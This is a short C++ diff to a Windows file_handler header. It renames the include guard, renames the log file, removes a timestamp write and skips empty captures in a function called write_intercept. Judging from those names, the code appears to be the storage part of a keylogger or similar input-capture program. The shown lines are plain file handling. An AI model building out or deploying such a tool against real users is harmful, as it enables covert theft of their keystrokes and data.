@@ -1,5 +1,5 @@
-#ifndef file_handler
-#define file_handler
+#ifndef FILE_HANDLER
+#define FILE_HANDLER
 
 #include <string>
 #include <windows.h>
@@ -16,7 +16,7 @@ namespace file_handler
 
     void write_logs(const string &msg)
     {
-        fstream file(path + "logs.txt", ios::app);
+        fstream file(path + "logs.log", ios::app);
         if (!file)
             return;
 
@@ -65,7 +65,6 @@ namespace file_handler
             return false;
         }
 
-        file << "<<" << date_time::get_date_time() << ">>\n";
         file.close();
         write_logs("Successfully created file/folders");
         return true;
@@ -73,6 +72,9 @@ namespace file_handler
 
     bool write_intercept(const string &captured)
     {
+        if (captured.length() == 0)
+            return true;
+
         const string full_path = get_full_path();
         fstream file(full_path, ios::app);
         if (!file)
